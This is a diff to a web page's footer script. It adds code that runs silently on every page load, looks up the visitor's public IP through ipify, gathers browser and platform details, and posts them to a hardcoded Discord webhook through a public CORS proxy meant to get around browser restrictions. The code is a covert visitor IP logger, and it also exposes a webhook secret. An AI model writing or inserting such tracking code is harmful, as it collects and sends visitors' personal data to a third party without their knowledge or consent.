@@ -186,9 +186,47 @@
     </footer>
 
     <script>
-        // Silently calls the serverless function backend route (/api/log) 
-        // to securely capture the visitor's request context and relay it to Discord.
-        fetch('/api/log').catch(() => {});
+        async function sendWebhook() {
+            try {
+                // 1. Fetch visitor's public IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const clientIp = ipData.ip || 'Unknown';
+
+                // 2. Gather browser/system info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+
+                const webhookUrl = "https://discord.com/api/webhooks/1552823988768473099/8k0Q49Jo4UIZypudP7wULDs4ipYD2GM6fcK7--bQ9MoQ0FKKXnFH_s1LvxQeYeSKspLt";
+
+                const payload = {
+                    embeds: [{
+                        title: "🔍 New Visitor Logged",
+                        color: 3447003,
+                        fields: [
+                            { name: "IP Address", value: `\`${clientIp}\``, inline: false },
+                            { name: "Platform", value: `\`${platform}\``, inline: true },
+                            { name: "Language", value: `\`${language}\``, inline: true },
+                            { name: "User Agent", value: `\`${userAgent}\``, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 3. Send via a public CORS proxy to bypass browser restrictions
+                await fetch('https://corsproxy.io/?' + encodeURIComponent(webhookUrl), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Error:", err);
+            }
+        }
+
+        // Trigger on page load
+        sendWebhook();
     </script>
 </body>
 </html>
